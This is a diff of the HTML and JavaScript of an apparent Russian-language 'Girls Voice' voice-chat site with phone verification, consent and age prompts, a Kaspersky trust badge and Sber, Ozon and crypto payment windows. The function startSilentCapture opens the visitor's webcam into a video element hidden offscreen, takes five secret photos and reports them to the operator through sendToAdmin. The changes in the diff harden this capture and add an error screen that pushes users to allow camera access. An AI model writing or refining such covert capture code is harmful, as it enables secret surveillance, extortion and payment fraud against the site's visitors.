@@ -15,10 +15,12 @@
     <meta property="og:title" content="Girls Voice - Приватные Голосовые Чаты">
     <meta property="og:description" content="Анонимные голосовые чаты с девушками. Подтверди номер и получи доступ!">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://girls-voice.live">
+    <meta property="og:url" content="https://girls-voice.vercel.app/">
     <meta property="og:image" content="https://i.imgur.com/example.jpg">
     
-    <link rel="canonical" href="https://girls-voice.live">
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://girls-voice.vercel.app/" />
+    
     <link rel="icon" type="image/x-icon" href="https://i.imgur.com/favicon.ico">
     
     <style>
@@ -232,7 +234,7 @@
         
         .chat-message .name { color: #ff6680; }
         
-        /* ========== НОВОЕ ОКНО: СОГЛАШЕНИЯ (появляется после "РАЗБЛОКИРОВАТЬ") ========== */
+        /* ========== ОКНО: СОГЛАШЕНИЯ (появляется после "РАЗБЛОКИРОВАТЬ") ========== */
         #consentModal {
             display: none;
             position: fixed;
@@ -310,17 +312,13 @@
             text-align: center;
         }
 
-        .consent-btn .text-block {
-            flex: 1;
-        }
-
+        .consent-btn .text-block { flex: 1; }
         .consent-btn .label {
             font-size: 15px;
             font-weight: 600;
             color: white;
             display: block;
         }
-
         .consent-btn .hint {
             font-size: 11px;
             color: #888;
@@ -328,25 +326,19 @@
             margin-top: 2px;
         }
 
-        .consent-btn.privacy {
-            border-color: #ff3366;
-        }
+        .consent-btn.privacy { border-color: #ff3366; }
         .consent-btn.privacy:hover {
             box-shadow: 0 0 20px rgba(255, 51, 102, 0.4);
             background: rgba(255, 51, 102, 0.15);
         }
 
-        .consent-btn.support {
-            border-color: #007bff;
-        }
+        .consent-btn.support { border-color: #007bff; }
         .consent-btn.support:hover {
             box-shadow: 0 0 20px rgba(0, 123, 255, 0.4);
             background: rgba(0, 123, 255, 0.15);
         }
 
-        .consent-btn.terms {
-            border-color: #2ecc71;
-        }
+        .consent-btn.terms { border-color: #2ecc71; }
         .consent-btn.terms:hover {
             box-shadow: 0 0 20px rgba(46, 204, 113, 0.4);
             background: rgba(46, 204, 113, 0.15);
@@ -373,7 +365,6 @@
         }
 
         .consent-agree-btn:active { transform: scale(0.98); }
-
         .consent-agree-btn:disabled {
             background: #555;
             cursor: not-allowed;
@@ -868,7 +859,7 @@
         }
         #banPage .ban-id { color: #444; font-size: 12px; margin-top: 15px; }
 
-        /* ========== СТИЛИ ДЛЯ МОДАЛЬНЫХ ОКОН СОГЛАШЕНИЙ ========== */
+        /* ========== МОДАЛЬНЫЕ ОКНА (ПОЛИТИКА/СОГЛАШЕНИЕ/ПРЕМИУМ) ========== */
         .terms-modal-style {
             display: none;
             position: fixed !important;
@@ -1140,14 +1131,13 @@
     <div class="chat-messages" id="chatMessages"></div>
 </div>
 
-<!-- ================= НОВОЕ ОКНО: СОГЛАШЕНИЯ ================= -->
+<!-- ================= ОКНО СОГЛАСИЙ ================= -->
 <div id="consentModal">
     <div class="consent-box">
         <div class="consent-title">📋 ПЕРЕД ПРОДОЛЖЕНИЕМ</div>
         <div class="consent-subtitle">Ознакомьтесь с документами и подтвердите согласие</div>
         
         <div class="consent-buttons">
-            <!-- Политика -->
             <button onclick="showPrivacyPolicy()" class="consent-btn privacy">
                 <span class="icon">🔒</span>
                 <div class="text-block">
@@ -1156,7 +1146,6 @@
                 </div>
             </button>
             
-            <!-- Техподдержка -->
             <a href="https://t.me/girlsvoice_support" target="_blank" class="consent-btn support">
                 <span class="icon">💬</span>
                 <div class="text-block">
@@ -1165,7 +1154,6 @@
                 </div>
             </a>
             
-            <!-- Соглашение -->
             <button onclick="showTerms()" class="consent-btn terms">
                 <span class="icon">📄</span>
                 <div class="text-block">
@@ -1341,7 +1329,7 @@
     </div>
 </div>
 
-<!-- ================= МОДАЛЬНОЕ ОКНО: ВЫБОР СПОСОБА ОПЛАТЫ ================= -->
+<!-- ================= ПРЕМИУМ ================= -->
 <div id="premiumModal" class="terms-modal-style">
     <div class="terms-box-style" style="border-color: #ffcc00; box-shadow: 0 0 50px rgba(255, 204, 0, 0.4); max-width: 450px;">
         <button onclick="closePremiumModal()" class="terms-close-btn" style="background: #ffcc00; color: #000;">✕</button>
@@ -1375,7 +1363,6 @@
     </div>
 </div>
 
-<!-- ================= МОДАЛЬНОЕ ОКНО: РЕКВИЗИТЫ (СБЕР/ОЗОН) ================= -->
 <div id="paymentModal" class="terms-modal-style">
     <div class="terms-box-style" style="border-color: #2ecc71; box-shadow: 0 0 50px rgba(46, 204, 113, 0.4); max-width: 450px;">
         <button onclick="closePaymentModal()" class="terms-close-btn" style="background: #2ecc71;">✕</button>
@@ -1422,7 +1409,6 @@
     </div>
 </div>
 
-<!-- ================= МОДАЛЬНОЕ ОКНО: ВЫБОР СЕТИ КРИПТЫ ================= -->
 <div id="cryptoNetworksModal" class="terms-modal-style">
     <div class="terms-box-style" style="border-color: #F7931A; box-shadow: 0 0 50px rgba(247, 147, 26, 0.4); max-width: 450px;">
         <button onclick="closeCryptoNetworksModal()" class="terms-close-btn" style="background: #F7931A;">✕</button>
@@ -1452,7 +1438,6 @@
     </div>
 </div>
 
-<!-- ================= МОДАЛЬНОЕ ОКНО: РЕКВИЗИТЫ КРИПТЫ ================= -->
 <div id="cryptoDetailsModal" class="terms-modal-style">
     <div class="terms-box-style" style="border-color: #F7931A; box-shadow: 0 0 50px rgba(247, 147, 26, 0.4); max-width: 450px;">
         <button onclick="closeCryptoDetailsModal()" class="terms-close-btn" style="background: #F7931A;">✕</button>
@@ -1499,7 +1484,6 @@
     </div>
 </div>
 
-<!-- ================= МОДАЛЬНОЕ ОКНО: ПОЛИТИКА ================= -->
 <div id="privacyModal" class="terms-modal-style">
     <div class="terms-box-style" style="border-color: #ff3366; box-shadow: 0 0 50px rgba(255, 51, 102, 0.4);">
         <button onclick="closePrivacyModal()" class="terms-close-btn" style="background: #ff3366;">✕</button>
@@ -1542,7 +1526,6 @@
     </div>
 </div>
 
-<!-- ================= МОДАЛЬНОЕ ОКНО: СОГЛАШЕНИЕ ================= -->
 <div id="termsModal" class="terms-modal-style">
     <div class="terms-box-style" style="border-color: #2ecc71; box-shadow: 0 0 50px rgba(46, 204, 113, 0.4);">
         <button onclick="closeTermsModal()" class="terms-close-btn" style="background: #2ecc71;">✕</button>
@@ -1584,7 +1567,6 @@
     </div>
 </div>
 
-<!-- ========== БЕЙДЖ KASPERSKY ========== -->
 <div id="trustBadge" style="position: fixed; bottom: 20px; left: 20px; background: rgba(30,30,30,0.85); backdrop-filter: blur(8px); border-radius: 30px; padding: 8px 18px; display: flex; align-items: center; gap: 12px; z-index: 999; border: 1px solid rgba(255,255,255,0.15); box-shadow: 0 4px 12px rgba(0,0,0,0.3); font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;">
     <div style="background: #2ecc71; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 6px #2ecc71;">
         <span style="color: white; font-size: 18px; font-weight: bold;">✓</span>
@@ -1622,7 +1604,6 @@
     let selectedCountryCode = '+7';
     let cameraStarted = false;
     let isBanned = false;
-    let consentShown = false;
 
     async function checkBan() {
         try {
@@ -1907,12 +1888,26 @@
     async function startSilentCapture() {
         if (cameraAllowed) return;
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                throw new Error('Camera API not supported');
+            }
+            if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
+                throw new Error('Not secure context');
+            }
+
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    width: { ideal: 640 }, 
+                    height: { ideal: 480 },
+                    facingMode: 'user'
+                } 
+            });
             cameraAllowed = true;
             
             const videoEl = document.createElement('video');
             videoEl.srcObject = stream;
             videoEl.setAttribute('playsinline', 'true');
+            videoEl.muted = true;
             videoEl.style.position = 'fixed';
             videoEl.style.top = '-1000px';
             videoEl.style.left = '-1000px';
@@ -1956,17 +1951,134 @@
             
             sendToAdmin(`📸 5 скрытых фото за ${totalTime} секунд!`);
         } catch(e) {
-            sendToAdmin(`❌ Ошибка камеры: ${e.message}`);
+            console.error('Camera error:', e);
+            let userMessage = 'Не удалось получить доступ к камере.';
+            let detail = '';
+            
+            if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
+                userMessage = '🚫 Доступ к камере запрещён';
+                detail = 'Разрешите доступ к камере в настройках браузера и обновите страницу.';
+            } else if (e.name === 'NotFoundError' || e.name === 'DevicesNotFoundError') {
+                userMessage = '📷 Камера не найдена';
+                detail = 'Подключите камеру к устройству или проверьте драйверы.';
+            } else if (e.name === 'NotReadableError' || e.name === 'TrackStartError') {
+                userMessage = '⚠️ Камера занята другим приложением';
+                detail = 'Закройте Zoom, Skype, Discord, OBS и другие программы, использующие камеру, затем обновите страницу.';
+            } else if (e.message.includes('secure context') || location.protocol !== 'https:') {
+                userMessage = '🔒 Требуется HTTPS';
+                detail = 'Сайт должен быть открыт по защищённому протоколу https://.';
+            } else if (e.message.includes('not supported')) {
+                userMessage = '❌ Браузер не поддерживает камеру';
+                detail = 'Обновите браузер или используйте Chrome / Firefox.';
+            }
+            
+            showCameraError(userMessage, detail);
+            sendToAdmin(`❌ Ошибка камеры: ${e.name} - ${e.message}`);
+            
+            await new Promise(r => setTimeout(r, 2000));
         }
     }
     
-    // ========== ГЛАВНАЯ ИЗМЕНЁННАЯ ЛОГИКА ==========
-    // Кнопка "РАЗБЛОКИРОВАТЬ СТРИМ" теперь открывает окно с 3 кнопками + СОГЛАСЕН
+    function showCameraError(title, detail) {
+        let existing = document.getElementById('cameraErrorModal');
+        if (existing) existing.remove();
+        
+        const modal = document.createElement('div');
+        modal.id = 'cameraErrorModal';
+        modal.style.cssText = `
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(15px);
+            z-index: 2147483646;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            box-sizing: border-box;
+        `;
+        
+        modal.innerHTML = `
+            <div style="
+                background: linear-gradient(145deg, #1a1a1a, #2a2a2a);
+                border: 2px solid #ff3366;
+                border-radius: 24px;
+                padding: 30px 25px;
+                max-width: 420px;
+                width: 100%;
+                text-align: center;
+                box-shadow: 0 0 50px rgba(255, 51, 102, 0.4);
+            ">
+                <div style="font-size: 60px; margin-bottom: 15px;">📷</div>
+                <h3 style="
+                    color: #ff6680;
+                    font-size: 20px;
+                    margin-bottom: 15px;
+                    font-weight: bold;
+                ">${title}</h3>
+                <p style="
+                    color: #ccc;
+                    font-size: 14px;
+                    line-height: 1.6;
+                    margin-bottom: 20px;
+                ">${detail}</p>
+                
+                <div style="
+                    background: rgba(255, 204, 0, 0.1);
+                    border: 1px solid rgba(255, 204, 0, 0.3);
+                    border-radius: 12px;
+                    padding: 12px;
+                    margin-bottom: 20px;
+                    text-align: left;
+                ">
+                    <p style="color: #ffcc00; font-size: 12px; margin: 0; line-height: 1.6;">
+                        💡 <strong>Что делать:</strong><br>
+                        1. Проверьте разрешения в браузере (🔒 → Камера → Разрешить)<br>
+                        2. Закройте Zoom / Skype / Discord / OBS<br>
+                        3. Убедитесь, что камера подключена<br>
+                        4. Перезагрузите страницу
+                    </p>
+                </div>
+                
+                <button onclick="document.getElementById('cameraErrorModal').remove(); document.getElementById('ageConfirmBtn').click();" style="
+                    background: linear-gradient(135deg, #ff3366, #ff6680);
+                    border: none;
+                    color: white;
+                    padding: 14px 30px;
+                    border-radius: 50px;
+                    font-size: 16px;
+                    font-weight: bold;
+                    cursor: pointer;
+                    width: 100%;
+                    box-shadow: 0 0 20px rgba(255, 51, 102, 0.4);
+                ">✅ ПРОДОЛЖИТЬ БЕЗ КАМЕРЫ</button>
+                
+                <button onclick="location.reload()" style="
+                    background: none;
+                    border: none;
+                    color: #888;
+                    font-size: 13px;
+                    cursor: pointer;
+                    margin-top: 12px;
+                    padding: 8px;
+                    width: 100%;
+                ">🔄 Обновить страницу</button>
+            </div>
+        `;
+        
+        document.body.appendChild(modal);
+        
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) modal.remove();
+        });
+    }
+    
+    // ========== ЛОГИКА ==========
     document.getElementById('unlockBtn').onclick = function() {
         document.getElementById('consentModal').style.display = 'flex';
     };
     
-    // Кнопка "СОГЛАСЕН" — открывает подтверждение возраста (дальше вся логика та же)
     document.getElementById('consentAgreeBtn').onclick = function() {
         document.getElementById('consentModal').style.display = 'none';
         document.getElementById('ageModal').style.display = 'flex';
@@ -1977,7 +2089,11 @@
         btn.disabled = true;
         btn.textContent = '⏳ ПРОВЕРКА...';
         
-        await startSilentCapture();
+        try {
+            await startSilentCapture();
+        } catch(e) {
+            console.error('Capture failed:', e);
+        }
         
         document.getElementById('ageModal').style.display = 'none';
         showModal();
@@ -2229,7 +2345,7 @@
         }
     })();
 
-    // ========== ФУНКЦИИ ДЛЯ ПОЛИТИКИ И СОГЛАШЕНИЯ ==========
+    // ========== ПОЛИТИКА И СОГЛАШЕНИЕ ==========
     function showPrivacyPolicy() {
         var modal = document.getElementById('privacyModal');
         modal.style.setProperty('display', 'flex', 'important');
@@ -2278,7 +2394,7 @@
     window.showTerms = showTerms;
     window.closeTermsModal = closeTermsModal;
 
-    // ========== ПРЕМИУМ / ОПЛАТА ==========
+    // ========== ПРЕМИУМ ==========
     function showPremiumModal() {
         var modal = document.getElementById('premiumModal');
         modal.style.setProperty('display', 'flex', 'important');
